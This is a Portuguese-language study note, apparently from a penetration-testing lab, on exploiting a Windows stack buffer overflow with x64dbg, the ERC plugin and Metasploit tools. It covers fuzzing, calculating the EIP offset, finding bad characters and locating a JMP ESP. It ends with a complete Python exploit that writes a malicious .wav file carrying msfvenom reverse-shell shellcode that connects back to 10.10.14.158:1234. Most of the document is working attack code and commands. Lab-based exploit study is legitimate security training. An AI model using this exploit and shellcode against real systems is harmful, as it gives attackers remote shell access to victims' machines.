https://github.com/x64dbg/x64dbg
https://github.com/Andy53/ERC.Xdbg

Definindo um diretório padrão para o plugin:
```powershell
ERC --config SetWorkingDirectory C:\Users\htb-student\Desktop\
```

## Testando Parâmetros
Primeiro identificamos as possíveis entradas de dados e enviamos uma sequencia de A, a fim de quebrar a aplicação e identificar um possível Buffer Overflow.
Gerando uma sequência de A:
```powershell
python -c "print('A'*10000)"
```

Para criar um arquivo onde seu conteúdo será uma sequencia de A, utilizamos:
```powershell
python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
```

Para confirmar que o EIP foi sobreescrito, verificamos em Hide FPU se o valor de EPI é 41414141 ou o erro: `First chance exception on 41414141`
## Calculando o Offset de EIP
Vamos criar um padrão único para enviarmos no ponto vulnerável e identificar o Offset de EIP.
Podemos utilizar o ERC para criar o pattern:
```powershell
ERC --pattern c 5000
```
Ou utilizamos o pattern_create:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```

Enviamos novamente o arquivo agora com o pattern e verificamos o valor de EIP.
Com o valor retornado, vamos calcular o offset com o comando:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 31684630
```

Ou para utilizar o ERC para a mesma função, vamos primeiro identificar o ASCII do EIP clicando com o botão direito em EIP e selecionando Modify Value. Com o valor de ASCII rodamos o comando:
```powershell
ERC --pattern o 1hF0
```

## Controlando EIP
Com o Offset definido, podemos agora controlar o valor de EIP enviando o número de caracteres do offset + o valor que vai em EIP.
```python
def eip_control():
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    with open('control.wav', 'wb') as f:
        f.write(payload)
        
eip_control()
```
## Identificando Bad Characters
Para identificar os Bad Chars devemos ter duas listas de badchars, uma gerada pelo debuger e outra enviada no payload. Para criar um a lista de bytearray envie o comando:
```powershell
ERC --bytearray
```

Esse comando irá gerar duas listas, uma para o debugger e outra para utilizarmos no script. Vamos copiar os bytes de dentro do arquivo txt gerado e colar no nosso script.
Ao enviar o arquivo modificado para o programa, devemos identificar o endereço de ESP que é onde os bytes foram inseridos e compara-los com o comando:
```powershell
ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin
```

Ao identificar os bad chars, podemos gerar uma nova lista e repetir o processo:
```powershell
ERC --bytearray -bytes 0x00
```

## Finding a Return Instruction
Vamos utilizar um método depreciado para realizar a exploração, mas fundamental para o entendimento da técnica de Buffer Overflow. Os dados que enviamos além do Offset+EIP estão sendo gravados no topo da stack ESP, dessa forma, podemos inserir nosso código de shell reversa na ESP e utilizar um JMP ESP para direcionar o fluxo para o topo da pilha.

Para identificar todos os JMP ESP utilizamos o comando:
```powershell
ERC --ModuleInfo
```

Vamos eliminar da lista apresentada os endereços que tiverem True para NXCompat, Rebase ou ASLR.

Ao identificar um endereço, procure pelo mesmo na aba Symbols, de um duplo clique e aperta Ctrl+F para iniciar a pesquisa pelo JMP ESP (Também podemos pesquisar por CALL ESP).

Outra pesquisa é o PUSH ESP; RET, podemos utilizar a busca por pattern (Ctrl+b) com o valor 54C3 (TÃ).
## Jumping to Shellcode
Nessa etapa vamos criar o shellcode para explorar a aplicação.
Vamos utilizar o msfvenom para gerar um payload que será utilizado no python e irá abrir  a calculadora na máquina alvo:
```bash
msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
```

Nosso exploit final com o comando para RCE:
```python
from struct import pack

def eip_control():

    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32

    # all_chars = bytes([
    #     0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    #     ...,
    #     0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    # ])

    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.14.158 LPORT=1234 -f 'python'

    buf =  b""
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
    buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
    buf += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
    buf += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
    buf += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    buf += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
    buf += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
    buf += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
    buf += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
    buf += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
    buf += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
    buf += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
    buf += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
    buf += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a"
    buf += b"\x0e\x9e\x68\x02\x00\x04\xd2\x89\xe6\x6a\x10\x56"
    buf += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
    buf += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
    buf += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
    buf += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
    buf += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
    buf += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
    buf += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
    buf += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
    buf += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
    buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
    
    payload = buffer + eip + nop + buf
    with open('control.wav', 'wb') as f:
        f.write(payload)
  
eip_control()
```